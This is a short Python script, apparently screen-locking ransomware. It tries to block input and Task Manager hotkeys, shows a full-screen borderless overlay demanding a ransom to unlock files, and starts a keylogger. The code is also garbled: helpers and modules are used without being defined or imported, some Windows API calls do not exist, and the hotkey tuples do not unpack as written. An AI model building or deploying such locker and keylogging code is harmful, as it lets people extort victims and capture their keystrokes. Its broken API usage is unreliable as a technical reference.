import platform
from ctypes import windll
import tkinter as tk
from pynput.keyboard import Listener, Key

# Step 1: Environment Check
def check_environment():
    os_name = platform.system()
    os_version = platform.release()

    print(f"Operating System: {os_name} - Version: {os_version}")
    resolution = get_screen_resolution()
    print(f"Screen Resolution: {resolution[0]}x{resolution[1]}")

# Step 2: UI Suppression
def disable_task_manager():
    # Disable Ctrl + Alt + Del, Shift + Alt + Del, Ctrl + Shift + Esc
    key_state = windll.user32.GetOEMUnicodeTable()
    hotkeys = [
        (win32con.VK_LCONTROL, win32con.VK_RALT, ord('D')),
        (win32con.VK_SHIFT, win32con.VK_LALT, win32con.VK_D),
        (win32con.VK_CONTROL, win32con.VK_RCONTROL, win32con.VK_S, True)
    ]

    for vk1, vk2, vk3 in hotkeys:
        key = windll.user32.MapVirtualKey(vk1, 0)
        windll.user32.BlockInput(1)  # Block input
        windll.user32.SendInput([windll.user32.MakeLong(vk1, key), 0], 2)
        if vk2:
            key = windll.user32.MapVirtualKey(vk2, 0)
            windll.user32.SendInput([windll.user32.MakeLong(vk2, key), 0], 2)
        if vk3:
            key = windll.user32.MapVirtualKey(vk3, 0)
            windll.user32.SendInput([windll.user32.MakeLong(vk3, key), 0], 1)

    # Disable Ctrl + Shift + Esc
    windll.user32.BlockInput(1) 
    windll.user32.SendInput([windll.user32.MakeLong(win32con.VK_CONTROL, win32api.MapVirtualKey(win32con.VK_S, 0)), 0], 2)
    windll.user32.SendInput([windll.user32.MakeLong(win32con.VK_RCONTROL, 0), 0], 1)

# Step 4: Input Interception
def on_press(key):
    print(f"Pressed {key}")

def start_key_logger():
    listener = Listener(on_press=on_press)
    with listener:
        listener.join()

# Step 3: Overlay Creation
def create_overlay():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.overrideredirect(True)  # Remove the title bar and borders

    label = tk.Label(root, text="Your files are locked.\nPay a ransom to unlock them.", font=("Arial", 24))
    label.pack(pady=100)

    def close_window():
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", close_window)
    root.mainloop()

if __name__ == "__main__":
    check_environment()
    disable_task_manager()
    
    # Step 3: Overlay Creation
    create_overlay()
    
    # Step 4: Input Interception
    start_key_logger()
